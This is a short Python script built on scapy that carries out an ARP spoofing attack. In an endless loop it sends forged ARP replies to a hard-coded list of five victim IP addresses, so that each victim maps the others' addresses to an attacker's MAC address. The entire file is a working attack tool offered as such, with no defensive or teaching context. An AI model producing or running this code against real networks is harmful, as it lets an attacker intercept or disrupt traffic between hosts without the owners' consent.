#import all required librarirs
from scapy.all import ARP, send
import time

#create a list of victims IP address
victims = ["10.0.0.2","10.0.0.3","10.0.0.4","10.0.0.5","10.0.0.6"]
attacker_mac="0a:af:0c:ce:31:74" #attacker mac address

#define a function to send spoofed packets 
def attack(target_ip, spoofed_ip):
	packet=ARP(op=2, pdst=target_ip, hwsrc=attacker_mac, psrc=spoofed_ip)
	send(packet, verbose=False)

#infine loop for sending the spoofed packets 
while True:
	for target in victims:
		for spoofed in victims:
			if target != spoofed:
				attack(target,spoofed)
	time.sleep(2)

